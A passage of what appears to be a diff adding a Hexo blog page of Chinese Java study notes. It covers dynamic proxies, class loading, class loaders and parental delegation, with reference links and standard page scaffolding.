Throwable &#123;<br>        <span class="hljs-comment">//动态代理的本质，就是使用反射机制实现</span><br>        seeHouse();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> method.invoke(rent, args);<br>        <span class="hljs-comment">//return method.invoke(rent, args);</span><br>        fare();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介带看房子&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;收中介费&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//真实角色</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();<br>        <span class="hljs-comment">//代理角色，现在没有</span><br>        <span class="hljs-type">ProxyInvocationHangler</span> <span class="hljs-variable">pih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyInvocationHangler</span>();<br>        <span class="hljs-comment">//通过调用程序处理角色来处理我们要调用的接口对象</span><br>        pih.setRent(host);<br>        <span class="hljs-type">Rent</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Rent) pih.getProxy();<br>        proxy.rent();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>案例二：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo04;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">//使用此类自动生成代理类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyInvocationHangler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">//被代理的接口</span><br>    <span class="hljs-keyword">private</span> Object target;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTarget</span><span class="hljs-params">(Object target)</span> &#123;<br>        <span class="hljs-built_in">this</span>.target = target;<br>    &#125;<br><br>    <span class="hljs-comment">//生成得到代理类</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(),<br>                                      target.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//处理代理实例，并返回结果</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        log(method.getName());<br>        <span class="hljs-comment">//动态代理的本质，就是使用反射机制实现</span><br>        <span class="hljs-keyword">return</span> method.invoke(target, args);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;执行了&quot;</span>+msg+<span class="hljs-string">&quot;方法&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo04;<br><br><span class="hljs-keyword">import</span> com.kuang.demo02.UserService;<br><span class="hljs-keyword">import</span> com.kuang.demo02.UserServiceImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//真实角色</span><br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">//代理角色，现在没有p</span><br>        <span class="hljs-type">ProxyInvocationHangler</span> <span class="hljs-variable">pih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyInvocationHangler</span>();<br>        <span class="hljs-comment">//设置代理对象</span><br>        pih.setTarget(userService);<br>        <span class="hljs-comment">//动态生成代理类</span><br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (UserService) pih.getProxy();<br>        proxy.add();<br>        <span class="hljs-comment">//        proxy.delete();</span><br>        <span class="hljs-comment">//        proxy.update();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="4、类的动态加载"><a href="#4、类的动态加载" class="headerlink" title="4、类的动态加载"></a>4、类的动态加载</h1><blockquote>
+<p><font style="color:rgb(33, 37, 41);">Java类加载机制和对象创建过程</font></p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000023876273">https://segmentfault.com/a/1190000023876273</a></p>
+<p><font style="color:rgb(60, 60, 67);">类加载过程详解</font></p>
+<p><a target="_blank" rel="noopener" href="https://javaguide.cn/java/jvm/class-loading-process.html">https://javaguide.cn/java/jvm/class-loading-process.html</a></p>
+</blockquote>
+<h3 id="类加载过程："><a href="#类加载过程：" class="headerlink" title="类加载过程："></a>类加载过程：</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757858.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757062.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>**加载：**将类的 class 文件字节码加载到内存，并将静态数据转化为方法区的运行时数据结构，然后生成一个 java.lang.Class 对象</li>
+<li>**链接：**将java类二进制数据合并到 JRE中<ul>
+<li>**验证：**确保加载的类信息符合JVM规范，没有安全方面的问题</li>
+<li>**准备：**正式为类变量 （static） 分配内存并设置类变量默认初始值的阶段（所以说static在初始化之前就已经有了一个值），这些内存都将在方法区中进行分配</li>
+<li>**解析：**虚拟机将常量池内的符号引用替换为直接引用的过程</li>
+</ul>
+</li>
+<li>**初始化：**执行初始化方法 <code>&lt;clinit&gt; ()</code>方法的过程，是类加载的最后一步，这一步 JVM 才开始真正执行类中定义的 Java 程序代码(字节码)。<code>&lt;clinit&gt; ()</code>方法会将该类的静态变量合并。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.reflection;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        System.out.println(A.m);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        1、加载到内存，会在堆产生一个类对应的 Class 对象</span><br><span class="hljs-comment">        2、链接，链接结束后 m=0</span><br><span class="hljs-comment">        3、初始化</span><br><span class="hljs-comment">            &lt;clinit&gt;()&#123;</span><br><span class="hljs-comment">                System.out.println(&quot;A类静态代码块初始化&quot;);</span><br><span class="hljs-comment">                m = 300;</span><br><span class="hljs-comment">                m = 100;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            m = 100</span><br><span class="hljs-comment">         */</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;A类静态代码块初始化&quot;</span>);<br>        m = <span class="hljs-number">300</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;A类的无参构造初始化&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="类加载器："><a href="#类加载器：" class="headerlink" title="类加载器："></a>类加载器：</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758397.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java">ppackage com.kuang.reflection;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//获取系统类的加载器</span><br>        ClassLoader systemClassLoader=ClassLoader.getSystemClassLoader();<br>        System.out.println(systemClassLoader);<br><br>        <span class="hljs-comment">//获取系统类的加载器的父类加载器-&gt;扩展类加载器</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> systemClassLoader.getParent();<br>        System.out.println(parent);<br><br>        <span class="hljs-comment">//获取扩展类加载器的父类加载器--&gt;根加载器（c/c++）</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent1</span> <span class="hljs-operator">=</span> parent.getParent();<br>        System.out.println(parent1);<br><br>        <span class="hljs-comment">//测试当前类是哪个类加载器加载的</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.kuang.reflection.Test07&quot;</span>).getClassLoader();<br>        System.out.println(classLoader);<br><br>        <span class="hljs-comment">//测试 jdk 内部的类是谁加载的</span><br>        classLoader=Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getClassLoader();<br>        System.out.println(classLoader);<br><br>        <span class="hljs-comment">//获得系统类加载器可以加载的路径</span><br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;java.class.path&quot;</span>));<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\charsets.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\deploy.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\access-bridge-64.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\cldrdata.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\dnsns.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\jaccess.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\jfxrt.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\localedata.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\nashorn.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunec.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunjce_provider.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunmscapi.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunpkcs11.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\zipfs.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\javaws.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jce.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jfr.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jfxswt.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jsse.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\management-agent.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\plugin.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\resources.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\rt.jar;</span><br><span class="hljs-comment">        D:\JavaCode\study_code\annotation&amp;reflection\annotation\target\classes;</span><br><span class="hljs-comment">        C:\Users\SZZY\AppData\Local\Programs\IntelliJ IDEA Ultimate\lib\idea_rt.jar</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         */</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758656.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h3><p>参考：<a target="_blank" rel="noopener" href="https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B">https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luckforefforts/p/13642685.html">https://www.cnblogs.com/luckforefforts/p/13642685.html</a></p>
+<p><font style="color:rgb(89, 97, 114);">如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。</font></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><font style="color:rgb(34, 34, 38);">java序列化与反序列化全讲解</font></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mocas_wang/article/details/107621010">https://blog.csdn.net/mocas_wang&#x2F;article&#x2F;details&#x2F;107621010</a></p>
+<p><font style="color:rgb(37, 41, 51);">为什么HashMap要自己实现writeObject和readObject方法？</font></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903954774491144">https://juejin.cn/post/6844903954774491144</a></p>
+<p><font style="color:rgb(37, 41, 51);">谈谈Java反射：从入门到实践，再到原理</font></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904025607897096">https://juejin.cn/post/6844904025607897096</a></p>
+<p><font style="color:rgb(25, 27, 31);">设计模式（四）——搞懂什么是代理模式</font></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/72644638">https://zhuanlan.zhihu.com/p/72644638</a></p>
+<p><font style="color:rgb(33, 37, 41);">Java类加载机制和对象创建过程</font></p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000023876273">https://segmentfault.com/a/1190000023876273</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java-%E5%AD%A6%E4%B9%A0/" class="print-no-link">#java 学习</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java 反序列化学习</div>
+      <div>http://xvshifu.github.io/2025/08/26/Java序列化与反序列化/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xvsf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年8月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/08/30/CC1/" title="CC1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CC1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/20/JshERP-2.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="华夏ERP 2.3 代码审计">
+                        <span class="hidden-mobile">华夏ERP 2.3 代码审计</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">
+
+  <!-- 计时器 -->
+  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
+    🚀 已运行：
+    <span id="timeDate">载入天数...</span>
+    <span id="times">载入时分秒...</span>
+    <script>
+      function createtime() {
+          var now = new Date();
+          var grt = new Date("08/07/2025 00:00:00");
+          var diff = now - grt;
+
+          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
+          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
+          var minutes = Math.floor((diff / 1000 / 60) % 60);
+          var seconds = Math.floor((diff / 1000) % 60);
+
+          if(hours<10) hours="0"+hours;
+          if(minutes<10) minutes="0"+minutes;
+          if(seconds<10) seconds="0"+seconds;
+
+          document.getElementById("timeDate").innerHTML = days + " 天";
+          document.getElementById("times").innerHTML = hours + " 时 " + minutes + " 分 " + seconds + " 秒";
+      }
+      setInterval(createtime, 1000);
+      createtime();
+    </script>
+  </div>
+
+  <!-- 自定义内容 -->
+  
+    <div style="margin-bottom:10px; font-size:13px; color:#666;">
+      ❤️  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+
+
+  <!-- PV/UV 统计（Busuanzi） -->
+  
+    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
+      👁‍🗨 总访问量：<span id="busuanzi_value_page_pv">载入中...</span>  
+      🧑 总访客数：<span id="busuanzi_value_site_uv">载入中...</span>
+    </div>
+    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
+  
+
+
+</div>
+
+<script src="/js/summon-plane.js"></script>
+
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
